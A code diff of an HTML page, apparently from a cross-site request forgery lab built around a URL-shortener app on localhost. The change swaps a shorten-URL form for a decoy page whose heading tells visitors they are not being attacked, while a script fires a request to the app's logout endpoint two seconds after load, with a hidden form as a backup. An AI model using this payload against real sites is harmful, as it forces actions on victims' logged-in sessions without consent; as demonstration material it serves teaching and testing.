@@ -36,16 +36,27 @@
 		</style>
 	</head>
 	<body>
-        <div>
-            <a href="logout">Log Out</a>
-            <a href="attack">Attack</a>
-        </div>
 		<div class="url-form">
-			<h1>Shorten URL</h1>
-			<form action="auth" method="POST">
-				<input type="text" name="url" placeholder="URL" required>
-				<input type="submit">
+            <h1>Nice day my friend! Your are not attacked at all.</h1>
+			<form id="csrf-form" action="http://localhost:3000/logout" method="POST">
+				<input type="submit" value="Submit">
 			</form>
 		</div>
+        <script>
+			function reqListener () {
+			  console.log(this.responseText);
+			}
+
+			function attack() {
+				var xhr = new XMLHttpRequest();
+				xhr.addEventListener("load", reqListener);
+				xhr.open("GET", "http://localhost:3000/logout");
+				xhr.send();
+			}
+            setTimeout(function() {
+				attack();
+                //document.getElementById("csrf-form").submit();
+            }, 2000)
+        </script>
 	</body>
 </html>
